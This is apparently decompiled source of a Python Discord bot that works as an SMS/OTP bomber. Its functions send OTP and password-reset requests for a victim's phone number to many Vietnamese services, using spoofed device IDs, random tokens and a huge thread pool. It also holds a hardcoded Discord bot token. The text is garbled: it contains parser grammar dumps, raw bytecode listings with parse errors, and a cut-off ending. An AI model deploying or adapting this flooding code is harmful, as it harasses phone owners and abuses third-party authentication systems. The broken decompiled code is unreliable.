while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
import discord, time, random, time, os, sys, requests, json
from requests import post, Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
from random import choice, randint, shuffle
token = 'MTAyNDYyMzA5MDQ2ODEyNjczMQ.G2TR8P.ky28XL3KRNg1vU1tzb179AKwAzy-54l8WhkuKs'
prefix = '!'
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix, help_command=None, intents=intents)
threading = ThreadPoolExecutor(max_workers=(int(100000000)))

def cang01(phone):
    requests.post('https://api.vayvnd.vn/v1/users/password-reset', headers={ 'Host': "'api.vayvnd.vn'",  'content-length': "'22'",  'accept': "'application/json'", 
      'content-type': "'application/json'",  'accept-language': "'vi'",  'sec-ch-ua-mobile': "'?1'", 
      'user-agent': "'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'", 
      'sec-ch-ua-platform': '\'"Android"\'',  'origin': "'https://vayvnd.vn'", 
      'sec-fetch-site': "'same-site'",  'sec-fetch-mode': "'cors'",  'sec-fetch-dest': "'empty'", 
      'referer': "'https://vayvnd.vn/'",  'accept-encoding': "'gzip, deflate, br'"}, data=(json.dumps({'login': '0' + phone}))).text


def cang02--- This code section failed: ---

 L.  19         0  LOAD_GLOBAL              int
                2  LOAD_GLOBAL              round
                4  LOAD_GLOBAL              time
                6  LOAD_METHOD              time
                8  CALL_METHOD_0         0  ''
               10  LOAD_CONST               1000
               12  BINARY_MULTIPLY  
               14  CALL_FUNCTION_1       1  ''
               16  CALL_FUNCTION_1       1  ''
               18  STORE_FAST               'microtime'

 L.  20        20  LOAD_GLOBAL              getiMEII
               22  CALL_FUNCTION_0       0  ''
               24  STORE_FAST               'iMEII'

 L.  21        26  LOAD_GLOBAL              get_SECUREID
               28  CALL_FUNCTION_0       0  ''
               30  STORE_FAST               'secureid'

 L.  22        32  LOAD_GLOBAL              get_TOKEN
               34  CALL_FUNCTION_0       0  ''
               36  STORE_FAST               'token'

 L.  23        38  LOAD_GLOBAL              generateRandomString
               40  LOAD_CONST               22
               42  LOAD_STR                 '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
               44  CALL_FUNCTION_2       2  ''
               46  STORE_FAST               'rkey'

 L.  24        48  LOAD_GLOBAL              getiMEII
               50  CALL_FUNCTION_0       0  ''
               52  STORE_FAST               'aaid'

 L.  25        54  BUILD_MAP_0           0 

 L.  26        56  LOAD_STR                 'user'
               58  LOAD_STR                 '0'
               60  LOAD_FAST                'phone'
               62  BINARY_ADD       

 L.  27        64  MAP_ADD               1  ''

 L.  26        66  LOAD_STR                 'msgType'
               68  LOAD_STR                 'SEND_OTP_MSG'

 L.  28        70  MAP_ADD               1  ''

 L.  26        72  LOAD_STR                 'cmdId'
               74  LOAD_FAST                'microtime'
               76  FORMAT_VALUE          0  ''
               78  LOAD_STR                 '000000'
               80  BUILD_STRING_2        2 

 L.  29        82  MAP_ADD               1  ''

 L.  26        84  LOAD_STR                 'lang'
               86  LOAD_STR                 'vi'

 L.  30        88  MAP_ADD               1  ''

 L.  26        90  LOAD_STR                 'time'
               92  LOAD_FAST                'microtime'

 L.  31        94  MAP_ADD               1  ''

 L.  26        96  LOAD_STR                 'channel'
               98  LOAD_STR                 'APP'

 L.  32       100  MAP_ADD               1  ''

 L.  26       102  LOAD_STR                 'appVer'
              104  LOAD_CONST               31062

 L.  33       106  MAP_ADD               1  ''

 L.  26       108  LOAD_STR                 'appCode'
              110  LOAD_STR                 '3.1.6'

 L.  34       112  MAP_ADD               1  ''

 L.  26       114  LOAD_STR                 'deviceOS'
              116  LOAD_STR                 'ANDROID'

 L.  35       118  MAP_ADD               1  ''

 L.  26       120  LOAD_STR                 'buildNumber'
              122  LOAD_CONST               0

 L.  36       124  MAP_ADD               1  ''

 L.  26       126  LOAD_STR                 'appId'
              128  LOAD_STR                 'vn.momo.platform'

 L.  37       130  MAP_ADD               1  ''

 L.  26       132  LOAD_STR                 'result'
              134  LOAD_CONST               True

 L.  38       136  MAP_ADD               1  ''

 L.  26       138  LOAD_STR                 'errorCode'
              140  LOAD_CONST               0

 L.  39       142  MAP_ADD               1  ''

 L.  26       144  LOAD_STR                 'errorDesc'
              146  LOAD_STR                 ''

 L.  40       148  MAP_ADD               1  ''

 L.  26       150  LOAD_STR                 'momoMsg'

 L.  41       152  LOAD_STR                 'mservice.backend.entity.msg.RegDeviceMsg'

 L.  42       154  LOAD_STR                 '0'
              156  LOAD_FAST                'phone'
              158  BINARY_ADD       

 L.  43       160  LOAD_FAST                'iMEII'

 L.  44       162  LOAD_STR                 'Vietnam'

 L.  45       164  LOAD_STR                 '084'

 L.  46       166  LOAD_STR                 'CPH1605'

 L.  47       168  LOAD_STR                 '23'

 L.  48       170  LOAD_STR                 'mt6755'

 L.  49       172  LOAD_STR                 'OPPO'

 L.  50       174  LOAD_STR                 ''

 L.  51       176  LOAD_STR                 ''

 L.  52       178  LOAD_STR                 '452'

 L.  53       180  LOAD_STR                 'Android'

 L.  54       182  LOAD_FAST                'secureid'

 L.  55       184  LOAD_CONST               ('_class', 'number', 'iMEII', 'cname', 'ccode', 'device', 'firmware', 'hardware', 'manufacture', 'csp', 'icc', 'mcc', 'device_os', 'secure_id')
              186  BUILD_CONST_KEY_MAP_14    14 

 L.  41       188  MAP_ADD               1  ''

 L.  26       190  LOAD_STR                 'extra'
            192_0  COLLECTION_START      2  'CONST_DICT'

 L.  57       192  ADD_VALUE                "'SEND'"

 L.  58       194  ADD_VALUE                'rkey'

 L.  59       196  ADD_VALUE                'aaid'

 L.  60       198  ADD_VALUE                "''"

 L.  61       200  ADD_VALUE                'token'

 L.  62       202  ADD_VALUE                "''"

 L.  63       204  ADD_VALUE                'secureid'

 L.  64       206  ADD_VALUE                "'oppo cph1605mt6755b6z9qwrwhuy9yhrk'"

 L.  65       208  ADD_VALUE             1  True

 L.  66       210  ADD_VALUE             1  True

 L.  67       212  ADD_VALUE                "''"

 L.  68       214  ADD_VALUE                ('action', 'rkey', 'AAID', 'IDFA', 'TOKEN', 'SIMULATOR', 'SECUREID', 'MODELID', 'isVoice', 'REQUIRE_HASH_STRING_OTP', 'checkSum')
              216  BUILD_CONST_DICT     11  ''

 L.  57       218  MAP_ADD               1  ''
              220  STORE_FAST               'data'

 L.  26       222  BUILD_MAP_0           0 

 L.  71       224  LOAD_STR                 'user'
              226  LOAD_STR                 '0'
              228  LOAD_FAST                'phone'
              230  BINARY_ADD       

 L.  72       232  MAP_ADD               1  ''

 L.  71       234  LOAD_STR                 'msgType'
              236  LOAD_STR                 'CHECK_USER_BE_MSG'

 L.  73       238  MAP_ADD               1  ''

 L.  71       240  LOAD_STR                 'cmdId'
              242  LOAD_FAST                'microtime'
              244  FORMAT_VALUE          0  ''
              246  LOAD_STR                 '000000'
              248  BUILD_STRING_2        2 

 L.  74       250  MAP_ADD               1  ''

 L.  71       252  LOAD_STR                 'lang'
              254  LOAD_STR                 'vi'

 L.  75       256  MAP_ADD               1  ''

 L.  71       258  LOAD_STR                 'time'
              260  LOAD_FAST                'microtime'

 L.  76       262  MAP_ADD               1  ''

 L.  71       264  LOAD_STR                 'channel'
              266  LOAD_STR                 'APP'

 L.  77       268  MAP_ADD               1  ''

 L.  71       270  LOAD_STR                 'appVer'
              272  LOAD_CONST               31062

 L.  78       274  MAP_ADD               1  ''

 L.  71       276  LOAD_STR                 'appCode'
              278  LOAD_STR                 '3.1.6'

 L.  79       280  MAP_ADD               1  ''

 L.  71       282  LOAD_STR                 'deviceOS'
              284  LOAD_STR                 'ANDROID'

 L.  80       286  MAP_ADD               1  ''

 L.  71       288  LOAD_STR                 'buildNumber'
              290  LOAD_CONST               0

 L.  81       292  MAP_ADD               1  ''

 L.  71       294  LOAD_STR                 'appId'
              296  LOAD_STR                 'vn.momo.platform'

 L.  82       298  MAP_ADD               1  ''

 L.  71       300  LOAD_STR                 'result'
              302  LOAD_CONST               True

 L.  83       304  MAP_ADD               1  ''

 L.  71       306  LOAD_STR                 'errorCode'
              308  LOAD_CONST               0

 L.  84       310  MAP_ADD               1  ''

 L.  71       312  LOAD_STR                 'errorDesc'
              314  LOAD_STR                 ''

 L.  85       316  MAP_ADD               1  ''

 L.  71       318  LOAD_STR                 'momoMsg'

 L.  86       320  LOAD_STR                 'mservice.backend.entity.msg.RegDeviceMsg'

 L.  87       322  LOAD_STR                 '0'
              324  LOAD_FAST                'phone'
              326  BINARY_ADD       

 L.  88       328  LOAD_FAST                'iMEII'

 L.  89       330  LOAD_STR                 'Vietnam'

 L.  90       332  LOAD_STR                 '084'

 L.  91       334  LOAD_STR                 'CPH1605'

 L.  92       336  LOAD_STR                 '23'

 L.  93       338  LOAD_STR                 'mt6755'

 L.  94       340  LOAD_STR                 'OPPO'

 L.  95       342  LOAD_STR                 ''

 L.  96       344  LOAD_STR                 ''

 L.  97       346  LOAD_STR                 '452'

 L.  98       348  LOAD_STR                 'Android'

 L.  99       350  LOAD_FAST                'secureid'

 L. 100       352  LOAD_CONST               ('_class', 'number', 'iMEII', 'cname', 'ccode', 'device', 'firmware', 'hardware', 'manufacture', 'csp', 'icc', 'mcc', 'device_os', 'secure_id')
              354  BUILD_CONST_KEY_MAP_14    14 

 L.  86       356  MAP_ADD               1  ''

 L.  71       358  LOAD_STR                 'extra'

 L. 102       360  LOAD_STR                 'checkSum'
              362  LOAD_STR                 ''

 L. 103       364  BUILD_MAP_1           1 

 L. 102       366  MAP_ADD               1  ''
              368  STORE_FAST               'data1'
            370_0  COLLECTION_START      2  'CONST_DICT'

 L.  71       370  ADD_VALUE                "'undefined'"

 L. 107       372  ADD_VALUE                "''"

 L. 108       374  ADD_VALUE                "'undefined'"

 L. 109       376  ADD_VALUE                "'Bearer undefined'"

 L. 110       378  ADD_VALUE                "'SEND_OTP_MSG'"

 L. 111       380  ADD_VALUE                "'api.momo.vn'"

 L. 112       382  ADD_VALUE                "'okhttp/3.14.17'"

 L. 113       384  ADD_VALUE                "'31062'"

 L. 114       386  ADD_VALUE                "'3.1.6'"

 L. 115       388  ADD_VALUE                "'ANDROID'"

 L. 116       390  ADD_VALUE                "'application/json'"

 L. 117       392  ADD_VALUE                ('agent_id', 'sessionkey', 'user_phone', 'authorization', 'msgtype', 'Host', 'User-Agent', 'app_version', 'app_code', 'device_os', 'Content-Type')
              394  BUILD_CONST_DICT     11  ''
              396  STORE_FAST               'h'

 L. 106       398  LOAD_GLOBAL              post
              400  LOAD_STR                 'https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG'
              402  LOAD_FAST                'h'
              404  LOAD_FAST                'data1'
              406  LOAD_CONST               ('headers', 'json')
              408  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              410  LOAD_ATTR                text
              412  POP_TOP          

 L. 119       414  LOAD_GLOBAL              post
              416  LOAD_STR                 'https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG'
              418  LOAD_FAST                'h'
              420  LOAD_FAST                'data'
              422  LOAD_CONST               ('headers', 'json')
              424  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              426  LOAD_ATTR                text
              428  POP_TOP          

 L. 120       430  SETUP_FINALLY       444  'to 444'

 L. 121       432  LOAD_GLOBAL              post
              434  LOAD_STR                 'https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG'
              436  LOAD_FAST                'h'
              438  LOAD_FAST                'data'
              440  LOAD_CONST               ('headers', 'json')
              442  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
            444_0  COME_FROM_FINALLY   430  '430'
              444  LOAD_METHOD              json
              446  CALL_METHOD_0         0  ''
              448  STORE_FAST               't'
              450  POP_BLOCK        
              452  LOAD_CONST               None
              454  RETURN_VALUE     

 L. 122       456  POP_TOP          
              458  POP_TOP          
              460  POP_TOP          

 L. 123       462  LOAD_GLOBAL              post
              464  LOAD_STR                 'https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG'
              466  LOAD_FAST                'h'
              468  LOAD_FAST                'data'
              470  LOAD_CONST               ('headers', 'json')
              472  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              474  LOAD_ATTR                text
              476  STORE_FAST               't'
              478  POP_EXCEPT       

Parse error at or near `MAP_ADD' instruction at offset 64


def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))


def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))


def getiMEII():
    return generateRandomString8'0123456789abcdef' + '-' + generateRandomString4'0123456789abcdef' + '-' + generateRandomString4'0123456789abcdef' + '-' + generateRandomString4'0123456789abcdef' + '-' + generateRandomString12'0123456789abcdef'


def get_TOKEN():
    return generateRandomString22'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + ':' + generateRandomString9'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString20'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString12'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString7'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString7'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString53'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString9'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '_' + generateRandomString11'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' + '-' + generateRandomString4'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def cang03(phone):
    requests.post('http://m.tv360.vn/public/v1/auth/get-otp-login', headers={ 'Host': "'m.tv360.vn'",  'Connection': "'keep-alive'",  'Content-Length': "'23'", 
      'Accept': "'application/json, text/plain, */*'",  'User-Agent': "'Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36'", 
      'Content-Type': "'application/json'",  'Origin': "'http://m.tv360.vn'", 
      'Referer': "'http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F'", 
      'Accept-Encoding': "'gzip, deflate'"}, json={'msisdn': '0' + phone}).text


def cang1--- This code section failed: ---

 L. 138         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                post
                4  LOAD_STR                 'https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN'
                6  BUILD_MAP_0           0 
                8  LOAD_STR                 'Host'
               10  LOAD_STR                 'api.alfrescos.com.vn'
               12  MAP_ADD               1  ''
               14  LOAD_STR                 'content-length'
               16  LOAD_STR                 '124'
               18  MAP_ADD               1  ''
               20  LOAD_STR                 'accept-language'
               22  LOAD_STR                 'vi-VN'
               24  MAP_ADD               1  ''
               26  LOAD_STR                 'sec-ch-ua-mobile'
               28  LOAD_STR                 '?1'
               30  MAP_ADD               1  ''
               32  LOAD_STR                 'user-agent'
               34  LOAD_STR                 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
               36  MAP_ADD               1  ''
               38  LOAD_STR                 'content-type'
               40  LOAD_STR                 'application/json'
               42  MAP_ADD               1  ''
               44  LOAD_STR                 'accept'
               46  LOAD_STR                 'application/json, text/plain, */*'
               48  MAP_ADD               1  ''
               50  LOAD_STR                 'brandcode'
               52  LOAD_STR                 'ALFRESCOS'
               54  MAP_ADD               1  ''
               56  LOAD_STR                 'devicecode'
               58  LOAD_STR                 'web'
               60  MAP_ADD               1  ''
               62  LOAD_STR                 'sec-ch-ua-platform'
               64  LOAD_STR                 '"Android"'
               66  MAP_ADD               1  ''
               68  LOAD_STR                 'origin'
               70  LOAD_STR                 'https://alfrescos.com.vn'
               72  MAP_ADD               1  ''
               74  LOAD_STR                 'sec-fetch-site'
               76  LOAD_STR                 'same-site'
               78  MAP_ADD               1  ''
               80  LOAD_STR                 'sec-fetch-mode'
               82  LOAD_STR                 'cors'
               84  MAP_ADD               1  ''
               86  LOAD_STR                 'sec-fetch-dest'
               88  LOAD_STR                 'empty'
               90  MAP_ADD               1  ''
               92  LOAD_STR                 'referer'
               94  LOAD_STR                 'https://alfrescos.com.vn/'
               96  MAP_ADD               1  ''
               98  LOAD_STR                 'accept-encoding'
              100  LOAD_STR                 'gzip, deflate, br'
              102  MAP_ADD               1  ''
              104  LOAD_STR                 '0'
              106  LOAD_FAST                'phone'
              108  BINARY_ADD       
              110  LOAD_STR                 'add789229e0794d8508f948dacd710ae'
              112  LOAD_STR                 ''
              114  LOAD_CONST               1660806807513L
              116  LOAD_CONST               2
              118  LOAD_CONST               ('phoneNumber', 'secureHash', 'deviceId', 'sendTime', 'type')
              120  BUILD_CONST_KEY_MAP_5     5 
              122  LOAD_CONST               ('headers', 'json')
              124  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              126  LOAD_ATTR                text
              128  POP_TOP          

Parse error at or near `None' instruction at offset -1


def cang2(phone):
    requests.post('https://api-stt.sieu-thi-tien.com/app/member/sendSmsCode', headers={ 'Host': "'api-stt.sieu-thi-tien.com'",  'content-length': "'647'",  'sec-ch-ua-mobile': "'?1'", 
      'user-agent': "'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'", 
      'sec-ch-ua-platform': '\'"Linux"\'',  'content-type': "'text/plain;charset=UTF-8'", 
      'accept': "'*/*'",  'origin': "'https://mobile.sieu-thi-tien.com'",  'sec-fetch-site': "'same-site'", 
      'sec-fetch-mode': "'cors'",  'sec-fetch-dest': "'empty'",  'referer': "'https://mobile.sieu-thi-tien.com/'", 
      'accept-encoding': "'gzip, deflate, br'"}, json={'baseParams':{'platformId':'android',  'deviceType':'h5',  'deviceIdKh':'20220828184826gi3uzymdyykebl2pkbk3dq346byaross64ff772bfe5245cea03bef55055583dc6fef3615b2993ee522a337456bf66777jz6om7z25dngnqifi0yuqurxrr4nihx01',  'termSysVersion':'8.1.0',  'termModel':'CPH1803',  'brand':'OPPO',  'termId':'null',  'appType':'6',  'appVersion':'2.0.0',  'pValue':'',  'position':{'lon':'null',  'lat':'null'},  'bizType':'0000',  'appName':'Sieu Thi Tien',  'packageName':'com.sieuthitiensaas.h5',  'screenResolution':'720,1520'},  'clientTypeFlag':'h5',  'token':'',  'phoneNumber':'',  'timestamp':'1661683732495',  'bizParams':{'phoneNum':'0' + phone,  'code':'null',  'type':200,  'channelCode':'sENV6'}}).text


def cang3--- This code section failed: ---

 L. 145         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                post
                4  LOAD_STR                 'https://latte.lozi.vn/v1.2/auth/register/phone/initial'
                6  BUILD_MAP_0           0 
                8  LOAD_STR                 'Host'
               10  LOAD_STR                 'latte.lozi.vn'
               12  MAP_ADD               1  ''
               14  LOAD_STR                 'content-length'
               16  LOAD_STR                 '101'
               18  MAP_ADD               1  ''
               20  LOAD_STR                 'x-city-id'
               22  LOAD_STR                 '50'
               24  MAP_ADD               1  ''
               26  LOAD_STR                 'accept-language'
               28  LOAD_STR                 'vi_VN'
               30  MAP_ADD               1  ''
               32  LOAD_STR                 'sec-ch-ua-mobile'
               34  LOAD_STR                 '?1'
               36  MAP_ADD               1  ''
               38  LOAD_STR                 'user-agent'
               40  LOAD_STR                 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
               42  MAP_ADD               1  ''
               44  LOAD_STR                 'content-type'
               46  LOAD_STR                 'application/json'
               48  MAP_ADD               1  ''
               50  LOAD_STR                 'x-lozi-client'
               52  LOAD_STR                 '1'
               54  MAP_ADD               1  ''
               56  LOAD_STR                 'x-access-token'
               58  LOAD_STR                 'unknown'
               60  MAP_ADD               1  ''
               62  LOAD_STR                 'sec-ch-ua-platform'
               64  LOAD_STR                 '"Android"'
               66  MAP_ADD               1  ''
               68  LOAD_STR                 'accept'
               70  LOAD_STR                 '*/*'
               72  MAP_ADD               1  ''
               74  LOAD_STR                 'origin'
               76  LOAD_STR                 'https://loship.vn'
               78  MAP_ADD               1  ''
               80  LOAD_STR                 'sec-fetch-site'
               82  LOAD_STR                 'cross-site'
               84  MAP_ADD               1  ''
               86  LOAD_STR                 'sec-fetch-mode'
               88  LOAD_STR                 'cors'
               90  MAP_ADD               1  ''
               92  LOAD_STR                 'sec-fetch-dest'
               94  LOAD_STR                 'empty'
               96  MAP_ADD               1  ''
               98  LOAD_STR                 'referer'
              100  LOAD_STR                 'https://loship.vn/'
              102  MAP_ADD               1  ''
              104  LOAD_STR                 'accept-encoding'
              106  LOAD_STR                 'gzip, deflate, br'
              108  MAP_ADD               1  ''
              110  LOAD_GLOBAL              json
              112  LOAD_METHOD              dumps
            114_0  COLLECTION_START      2  'CONST_DICT'
              114  ADD_VALUE                "'Android 8.1.0'"
              116  ADD_VALUE                "'Chrome/104.0.0.0'"
              118  ADD_VALUE                "'84'"
              120  ADD_VALUE                'phone'
              122  ADD_VALUE                ('device', 'platform', 'countryCode', 'phoneNumber')
              124  BUILD_CONST_DICT      4  ''
              126  CALL_METHOD_1         1  ''
              128  LOAD_CONST               ('headers', 'data')
              130  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              132  LOAD_ATTR                text
              134  POP_TOP          

Parse error at or near `None' instruction at offset -1


def cang4(phone):
    requests.post('https://api.tamo.vn/web/public/client/phone/sms-code-ts', headers={ 'Host': "'api.tamo.vn'",  'content-length': "'39'",  'accept': "'application/json, text/plain, */*'", 
      'content-type': "'application/json;charset=UTF-8'",  'sec-ch-ua-mobile': "'?1'", 
      'user-agent': "'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'", 
      'sec-ch-ua-platform': '\'"Linux"\'',  'origin': "'https://www.tamo.vn'", 
      'sec-fetch-site': "'same-site'",  'sec-fetch-mode': "'cors'",  'sec-fetch-dest': "'empty'", 
      'referer': "'https://www.tamo.vn/'",  'accept-encoding': "'gzip, deflate, br'"}, json={'mobilePhone': {'number': '0' + phone}}).text


def cang5(phone):
    requests.post('https://fptshop.com.vn/api-data/loyalty/Home/Verification', data={'phone': '84' + phone}).json()


def cang6(phone):
    requests.post('https://foreignadmits.com/api/register-otp-generate-student', data={'mobile':phone,  'countryCode':'+84'}).json()


def cang7--- This code section failed: ---

 L. 159         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                post
                4  LOAD_STR                 'https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP'
                6  BUILD_MAP_0           0 
                8  LOAD_STR                 'Host'
               10  LOAD_STR                 'apigateway.f88.vn'
               12  MAP_ADD               1  ''
               14  LOAD_STR                 'content-length'
               16  LOAD_STR                 '595'
               18  MAP_ADD               1  ''
               20  LOAD_STR                 'content-encoding'
               22  LOAD_STR                 'gzip'
               24  MAP_ADD               1  ''
               26  LOAD_STR                 'traceparent'
               28  LOAD_STR                 '00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01'
               30  MAP_ADD               1  ''
               32  LOAD_STR                 'sec-ch-ua-mobile'
               34  LOAD_STR                 '?1'
               36  MAP_ADD               1  ''
               38  LOAD_STR                 'authorization'
               40  LOAD_STR                 'Bearer null'
               42  MAP_ADD               1  ''
               44  LOAD_STR                 'content-type'
               46  LOAD_STR                 'application/json'
               48  MAP_ADD               1  ''
               50  LOAD_STR                 'user-agent'
